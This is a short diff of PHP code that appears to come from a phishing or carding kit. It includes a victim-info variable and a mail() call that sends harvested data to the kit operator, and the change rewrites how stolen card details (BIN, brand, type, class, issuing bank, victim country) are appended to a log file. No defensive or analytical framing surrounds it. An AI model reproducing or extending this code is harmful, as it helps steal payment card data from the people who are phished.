@@ -131,8 +131,8 @@ $VictimInfo5 = $systemInfo['os'];
 include "result/res_ceceh.php";
 
         mail($to,$subj,$data,$headers);
-         $empas   = file_get_contents( $BIN_BANK - $BIN_COUNTRY);
-    $file = fopen("assets/logs/bin.txt", "a");
+        $empas   = "# $bin - $ccbrand - $cctype - $ccklas - $ccbank [ ".$systemInfo['country']." ]\n";
+    $file = fopen("assets/logs/bin.log", "a");
     fwrite($file, $empas);
     fclose($file);
 
